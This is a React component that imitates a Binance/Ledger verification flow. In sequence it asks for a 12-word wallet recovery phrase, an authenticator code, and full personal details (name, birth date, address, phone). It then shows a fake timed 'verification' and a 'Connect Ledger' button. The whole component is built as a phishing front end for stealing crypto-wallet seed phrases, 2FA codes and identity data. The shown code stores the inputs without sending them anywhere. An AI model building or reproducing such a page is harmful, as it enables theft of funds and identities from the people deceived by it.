import React, { useState, useEffect } from "react";
import { AlertTriangle } from "lucide-react";

const BinanceLedgerForm = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [mnemonic, setMnemonic] = useState("");
  const [mnemonicError, setMnemonicError] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [verificationCodeError, setVerificationCodeError] = useState("");
  const [showNotice, setShowNotice] = useState(false);
  const [personalDetails, setPersonalDetails] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    country: "",
    address: "",
    phoneNumber: ""
  });
  const [personalDetailsErrors, setPersonalDetailsErrors] = useState({});
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationComplete, setVerificationComplete] = useState(false);

  const countries = [
    "Afghanistan", "Albania", "Algeria", "Argentina", "Armenia", "Australia", "Austria", "Azerbaijan", "Bahrain", "Bangladesh", "Belarus", "Belgium", "Bolivia", "Bosnia and Herzegovina", "Brazil", "Bulgaria", "Cambodia", "Canada", "Chile", "China", "Colombia", "Costa Rica", "Croatia", "Cyprus", "Czech Republic", "Denmark", "Dominican Republic", "Ecuador", "Egypt", "Estonia", "Finland", "France", "Georgia", "Germany", "Ghana", "Greece", "Guatemala", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Ireland", "Israel", "Italy", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kuwait", "Latvia", "Lebanon", "Lithuania", "Luxembourg", "Malaysia", "Malta", "Mexico", "Morocco", "Netherlands", "New Zealand", "Nigeria", "Norway", "Oman", "Pakistan", "Panama", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Saudi Arabia", "Serbia", "Singapore", "Slovakia", "Slovenia", "South Africa", "South Korea", "Spain", "Sri Lanka", "Sweden", "Switzerland", "Taiwan", "Thailand", "Turkey", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Venezuela", "Vietnam"
  ];

  useEffect(() => {
    if (isVerifying) {
      const timer = setTimeout(() => {
        setIsVerifying(false);
        setVerificationComplete(true);
      }, 15000);
      return () => clearTimeout(timer);
    }
  }, [isVerifying]);

  const validateMnemonic = (value) => {
    const words = value.trim().split(/\s+/);
    if (words.length !== 12) {
      return "Recovery phrase must contain exactly 12 words";
    }
    return "";
  };

  const validateVerificationCode = (value) => {
    if (!/^\d{6}$/.test(value)) {
      return "Verification code must be 6 digits";
    }
    return "";
  };

  const validatePersonalDetails = (details) => {
    const errors = {};
    if (!details.firstName.trim()) errors.firstName = "First name is required";
    if (!details.lastName.trim()) errors.lastName = "Last name is required";
    if (!details.dateOfBirth) errors.dateOfBirth = "Date of birth is required";
    if (!details.country) errors.country = "Country is required";
    if (!details.address.trim()) errors.address = "Address is required";
    if (!details.phoneNumber.trim()) errors.phoneNumber = "Phone number is required";
    return errors;
  };

  const handleMnemonicSubmit = (e) => {
    e.preventDefault();
    const error = validateMnemonic(mnemonic);
    setMnemonicError(error);
    if (!error) {
      setCurrentStep(2);
    }
  };

  const handleVerificationSubmit = (e) => {
    e.preventDefault();
    const error = validateVerificationCode(verificationCode);
    setVerificationCodeError(error);
    if (!error) {
      setShowNotice(true);
    }
  };

  const handleNoticeConfirm = () => {
    setShowNotice(false);
    setCurrentStep(3);
  };

  const handlePersonalDetailsSubmit = (e) => {
    e.preventDefault();
    const errors = validatePersonalDetails(personalDetails);
    setPersonalDetailsErrors(errors);
    if (Object.keys(errors).length === 0) {
      setIsVerifying(true);
    }
  };

  const handleConnectLedger = () => {
    setCurrentStep(4);
  };

  const handlePersonalDetailsChange = (field, value) => {
    setPersonalDetails(prev => ({ ...prev, [field]: value }));
    if (personalDetailsErrors[field]) {
      setPersonalDetailsErrors(prev => ({ ...prev, [field]: "" }));
    }
  };

  // Notice Screen
  if (showNotice) {
    return (
      <div className="max-w-md mx-auto bg-binance-darkGray rounded-lg p-8 font-binance">
        <div className="text-center">
          <div className="flex items-center justify-center mb-6">
            <div className="w-8 h-8 bg-binance-yellow rounded-full flex items-center justify-center mr-3">
              <AlertTriangle className="w-5 h-5 text-binance-black" />
            </div>
            <h2 className="text-xl font-semibold text-white">⚠️ Important Notice</h2>
          </div>
          
          <div className="bg-binance-dark border border-binance-yellow/20 rounded-lg p-6 mb-8">
            <p className="text-binance-lightGray text-sm leading-relaxed">
              Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
            </p>
          </div>
          
          <button 
            onClick={handleNoticeConfirm}
            className="w-full bg-binance-yellow text-binance-black py-3 px-6 rounded font-bold hover:bg-opacity-90 transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200"
          >
            I Understand
          </button>
        </div>
      </div>
    );
  }

  // Verification in progress
  if (isVerifying) {
    return (
      <div className="max-w-md mx-auto bg-binance-darkGray rounded-lg p-8 font-binance">
        <div className="text-center">
          <div className="mb-6">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow mx-auto"></div>
          </div>
          <p className="text-white text-lg">Please wait a moment while we verify your details.</p>
        </div>
      </div>
    );
  }

  // Verification complete
  if (verificationComplete) {
    return (
      <div className="max-w-md mx-auto bg-binance-darkGray rounded-lg p-8 font-binance">
        <div className="text-center">
          <h2 className="text-2xl font-semibold text-white mb-8">Verification Successful</h2>
          <button 
            onClick={handleConnectLedger}
            className="w-full bg-binance-yellow text-binance-black py-3 px-6 rounded font-bold hover:bg-opacity-90 transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200"
          >
            Connect Ledger
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto bg-binance-darkGray rounded-lg p-6 md:p-8 font-binance">
      {/* Step 1: Recovery Phrase */}
      {currentStep === 1 && (
        <div>
          <h2 className="text-xl md:text-2xl font-semibold text-white mb-2 text-center">Enter Recovery Phrase</h2>
          <p className="text-binance-gray text-sm text-center mb-8">Enter your 12-word recovery phrase to continue</p>
          
          <form onSubmit={handleMnemonicSubmit} className="space-y-6">
            <div>
              <label className="block text-white text-sm font-medium mb-2">
                Recovery Phrase
              </label>
              <textarea
                value={mnemonic}
                onChange={(e) => {
                  setMnemonic(e.target.value);
                  if (mnemonicError) setMnemonicError("");
                }}
                placeholder="Enter your 12-word recovery phrase"
                className={`w-full h-32 px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow resize-none ${
                  mnemonicError ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                }`}
                rows={4}
              />
              {mnemonicError && (
                <p className="text-red-500 text-xs mt-2">{mnemonicError}</p>
              )}
            </div>
            
            <button 
              type="submit"
              className="w-full bg-binance-yellow text-binance-black py-3 px-6 rounded font-bold hover:bg-opacity-90 transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200"
            >
              Continue
            </button>
          </form>
        </div>
      )}

      {/* Step 2: Verification Code */}
      {currentStep === 2 && (
        <div>
          <h2 className="text-xl md:text-2xl font-semibold text-white mb-1 text-center">Enter Verification Code</h2>
          <p className="text-binance-gray text-sm text-center mb-8">Enter the code from your Google/Binance Authenticator.</p>
          
          <form onSubmit={handleVerificationSubmit} className="space-y-6">
            <div>
              <label className="block text-white text-sm font-medium mb-2">
                Verification Code
              </label>
              <input
                type="text"
                value={verificationCode}
                onChange={(e) => {
                  setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                  if (verificationCodeError) setVerificationCodeError("");
                }}
                placeholder="000000"
                className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                  verificationCodeError ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                }`}
                maxLength={6}
              />
              {verificationCodeError && (
                <p className="text-red-500 text-xs mt-2">{verificationCodeError}</p>
              )}
            </div>
            
            <button 
              type="submit"
              className="w-full bg-binance-yellow text-binance-black py-3 px-6 rounded font-bold hover:bg-opacity-90 transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200"
            >
              Verify
            </button>
          </form>
        </div>
      )}

      {/* Step 3: Personal Details */}
      {currentStep === 3 && (
        <div>
          <h2 className="text-xl md:text-2xl font-semibold text-white mb-2 text-center">Verify Details</h2>
          <p className="text-binance-gray text-sm text-center mb-8">Please provide your personal information for verification</p>
          
          <form onSubmit={handlePersonalDetailsSubmit} className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-white text-sm font-medium mb-2">
                  First Name
                </label>
                <input
                  type="text"
                  value={personalDetails.firstName}
                  onChange={(e) => handlePersonalDetailsChange('firstName', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.firstName ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                  placeholder="Enter your first name"
                />
                {personalDetailsErrors.firstName && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.firstName}</p>
                )}
              </div>

              <div>
                <label className="block text-white text-sm font-medium mb-2">
                  Last Name
                </label>
                <input
                  type="text"
                  value={personalDetails.lastName}
                  onChange={(e) => handlePersonalDetailsChange('lastName', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.lastName ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                  placeholder="Enter your last name"
                />
                {personalDetailsErrors.lastName && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.lastName}</p>
                )}
              </div>

              <div>
                <label className="block text-white text-sm font-medium mb-2">
                  Date of Birth
                </label>
                <input
                  type="date"
                  value={personalDetails.dateOfBirth}
                  onChange={(e) => handlePersonalDetailsChange('dateOfBirth', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.dateOfBirth ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                />
                {personalDetailsErrors.dateOfBirth && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.dateOfBirth}</p>
                )}
              </div>

              <div>
                <label className="block text-white text-sm font-medium mb-2">
                  Country
                </label>
                <select
                  value={personalDetails.country}
                  onChange={(e) => handlePersonalDetailsChange('country', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.country ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                >
                  <option value="">Select your country</option>
                  {countries.map((country) => (
                    <option key={country} value={country} className="bg-binance-dark text-white">
                      {country}
                    </option>
                  ))}
                </select>
                {personalDetailsErrors.country && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.country}</p>
                )}
              </div>

              <div className="md:col-span-2">
                <label className="block text-white text-sm font-medium mb-2">
                  Address
                </label>
                <input
                  type="text"
                  value={personalDetails.address}
                  onChange={(e) => handlePersonalDetailsChange('address', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.address ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                  placeholder="Enter your full address"
                />
                {personalDetailsErrors.address && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.address}</p>
                )}
              </div>

              <div className="md:col-span-2">
                <label className="block text-white text-sm font-medium mb-2">
                  Phone Number
                </label>
                <input
                  type="tel"
                  value={personalDetails.phoneNumber}
                  onChange={(e) => handlePersonalDetailsChange('phoneNumber', e.target.value)}
                  className={`w-full px-4 py-3 bg-binance-dark border rounded-md text-white text-sm placeholder-binance-gray focus:outline-none focus:ring-2 focus:ring-binance-yellow ${
                    personalDetailsErrors.phoneNumber ? 'border-red-500' : 'border-binance-gray hover:border-binance-lightGray focus:border-binance-yellow'
                  }`}
                  placeholder="Enter your phone number"
                />
                {personalDetailsErrors.phoneNumber && (
                  <p className="text-red-500 text-xs mt-2">{personalDetailsErrors.phoneNumber}</p>
                )}
              </div>
            </div>
            
            <button 
              type="submit"
              className="w-full bg-binance-yellow text-binance-black py-3 px-6 rounded font-bold hover:bg-opacity-90 transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200"
            >
              Submit for Verification
            </button>
          </form>
        </div>
      )}
    </div>
  );
};

export default BinanceLedgerForm;
